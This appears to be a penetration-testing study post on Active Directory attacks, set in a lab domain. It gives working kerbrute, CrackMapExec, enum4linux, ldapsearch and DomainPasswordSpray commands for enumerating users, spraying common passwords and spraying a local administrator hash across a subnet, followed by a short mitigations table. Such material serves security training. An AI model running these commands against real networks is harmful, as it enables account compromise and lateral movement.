---
title: "Detailed User Enumeration and Password Spraying - AD Attacks"
date: 2026-02-26 00:10:00 +0000
categories: [Active-Directory]
tags: [active-directory, password-spraying, kerbrute, crackmapexec, enumeration, kerberos]
---

## User Enumeration Methods

Organizations can identify valid domain users through several approaches:

- **SMB NULL sessions** to retrieve complete domain user lists from domain controllers
- **LDAP anonymous binds** for querying and extracting user information
- **Kerbrute** using wordlists like statistically-likely-usernames to validate accounts
- **Existing credentials** to query Active Directory directly

### Key Consideration: Password Policy

Before spraying, enumerate:
- Minimum password length requirements
- Password complexity settings
- Account lockout thresholds
- Bad password timer intervals

## Enumeration Tools & Techniques

### Kerbrute

Performs username enumeration using Kerberos Pre-Authentication without generating logon failures (Event ID 4625).

```bash
git clone https://github.com/ropnop/kerbrute.git
sudo make all
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### CrackMapExec

Enumerates domain users and displays bad password counts and timestamps:

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --users
```

### enum4linux

```bash
enum4linux -U 172.16.5.5
```

### ldapsearch / windapsearch

```bash
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"
```

## Password Spraying Techniques

### Linux-Based Spraying

```bash
# Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### Windows-Based Spraying

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

DomainPasswordSpray automatically generates user lists and respects lockout thresholds.

## Local Administrator Targeting

```bash
# Hash-based spraying
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H [hash] | grep +
```

The `--local-auth` flag prevents domain lockouts by attempting single authentication per machine.

## Mitigation Strategies

| Control | Details |
|---------|---------|
| **Multi-Factor Authentication** | Defeats credential-only compromise |
| **Access Restrictions** | Limit application access per least privilege |
| **Privilege Separation** | Separate accounts for administrative activities |
| **Network Segmentation** | Restricts lateral movement |
| **Password Hygiene** | Educate users on passphrases; block dictionary words |

> **Critical Note:** Failed Kerberos Pre-Authentication attempts will count towards an account's failed login count and can lead to account lockout during password spraying.
